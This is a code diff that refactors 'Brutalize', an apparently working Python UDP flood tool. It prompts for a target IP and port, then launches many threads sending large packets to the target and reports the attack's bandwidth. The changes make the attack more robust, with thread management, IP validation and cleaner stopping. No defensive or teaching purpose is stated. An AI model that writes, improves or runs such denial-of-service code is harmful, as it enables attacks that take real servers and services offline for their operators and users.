@@ -1,31 +1,30 @@
-# Import required libraries
 from socket import socket, AF_INET, SOCK_DGRAM
 from threading import Thread
-from random import choices, randint
+from random import randint
 from time import time, sleep
-from getpass import getpass as hinput
+import re
 
-# Define the Brutalize class
 class Brutalize:
     def __init__(self, ip, port, force, threads):
         self.ip = ip
         self.port = port
-        self.force = force # default: 1250
-        self.threads = threads # default: 100
+        self.force = force
+        self.threads = threads
         self.client = socket(family=AF_INET, type=SOCK_DGRAM)
-        # self.data = self._randbytes()
         self.data = str.encode("x" * self.force)
         self.len = len(self.data)
-    
-    # Start flooding attack    
+        self.on = False
+        self.threads_list = []
+
     def flood(self):
         self.on = True
         self.sent = 0
         for _ in range(self.threads):
-            Thread(target=self.send).start()
+            t = Thread(target=self.send)
+            t.start()
+            self.threads_list.append(t)
         Thread(target=self.info).start()
-    
-    # Display attack info    
+
     def info(self):
         interval = 0.05
         now = time()
@@ -33,58 +32,56 @@ class Brutalize:
         self.total = 0
         bytediff = 8
         mb = 1000000
-        gb = 1000000000       
+        gb = 1000000000
         while self.on:
             sleep(interval)
-            if not self.on:
-                break
             if size != 0:
                 self.total += self.sent * bytediff / gb * interval
                 print(f"{round(size)} Mb/s - Total: {round(self.total, 1)} Gb. {' '*20}", end='\r')
-            now2 = time()      
+            now2 = time()
             if now + 1 >= now2:
-                continue           
+                continue
             size = round(self.sent * bytediff / mb)
             self.sent = 0
             now += 1
-            
-    # Stop the attack        
+
     def stop(self):
         self.on = False
-        
-    # Send packets    
+        for thread in self.threads_list:
+            thread.join()
+
     def send(self):
         while self.on:
             try:
                 self.client.sendto(self.data, self._randaddr())
                 self.sent += self.len
-            except:
-                pass
-    # Generate a random address with the target IP and a random port        
+            except Exception as e:
+                print(f"Error sending packet: {e}")
+
     def _randaddr(self):
         return (self.ip, self._randport())
-    # Generate a random port number
+
     def _randport(self):
         return self.port or randint(1, 65535)
-# Main function to execute the script
+
+def validate_ip(ip):
+    pattern = re.compile(r"^(25[0-5]|2[0-4][0-9]|[0-1]?[0-9]{1,2})(\.(25[0-5]|2[0-4][0-9]|[0-1]?[0-9]{1,2})){3}$")
+    return bool(pattern.match(ip))
+
 def main():
     ip = input("Enter the IP to Brutalize: ")
-    try:
-        if ip.count('.') != 3:
-            int('error')
-        int(ip.replace('.',''))
-    except:
+    if not validate_ip(ip):
         print("Error! Please enter a correct IP address.")
         exit()
 
     port = input("Enter port [press enter to attack all ports]: ")
     if port == '':
-        port = None 
+        port = None
     else:
         try:
             port = int(port)
             if port not in range(1, 65535 + 1):
-                int('error')
+                raise ValueError
         except ValueError:
             print("Error! Please enter a correct port.")
             exit()
@@ -116,14 +113,13 @@ def main():
         brute.flood()
     except:
         brute.stop()
-        print("A fatal error has occured and the attack was stopped.", '')
+        print("A fatal error has occurred and the attack was stopped.")
     try:
-        while True:
-            sleep(1000000)
+        while brute.on:
+            sleep(1)
     except KeyboardInterrupt:
         brute.stop()
-        print(f"Attack stopped. {ip}{cport} was Brutalized with {round(brute.total, 1)} Gb.", '.')
-    print('\n')
+        print(f"\nAttack stopped. {ip}{cport} was Brutalized with {round(brute.total, 1)} Gb.", '.')
     input("Press enter to exit.")
 
 if __name__ == '__main__':
